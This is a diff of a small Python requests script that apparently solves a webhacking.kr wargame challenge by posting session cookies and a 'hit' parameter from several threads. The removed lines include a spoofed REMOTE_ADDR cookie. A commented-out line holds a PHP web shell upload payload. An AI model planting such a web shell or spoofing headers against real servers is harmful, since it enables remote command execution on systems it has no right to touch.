@@ -1,16 +1,12 @@
 import requests
-import hashlib
 import concurrent.futures
-import time
-import random
 
 
 URL = "https://webhacking.kr/challenge/code-5/"
-SESSION_ID = "uh10h2dmbcqe99b0pgp44gecov"
-cookies = {'PHPSESSID':SESSION_ID, 'REMOTE_ADDR':"17.27.70.12.00.12.00.12.1",'HTTP_USER_AGENT':"" }
+SESSION_ID = "123"
+cookies = {'PHPSESSID':SESSION_ID}
 
-data = { "kk": hashlib.md5("python-requests/2.31.0".encode()).hexdigest() }
-params ={"hit":"81239"}
+params ={"hit":"EliCopter770"}
 # answer=""
 # for i in range(97,123,2):
 #     answer +=chr(i)
@@ -18,7 +14,7 @@ params ={"hit":"81239"}
 # params = {"ans":answer}
 # files = {'file':('bla.php','<?php echo system($_GET[\'cmd\']) ?>')}
 def send_point():
-    response = requests.post(URL,params=params,data=data, cookies=cookies)
+    response = requests.post(URL,params=params, cookies=cookies)
     print(response.text)
 
 num_threads = 10
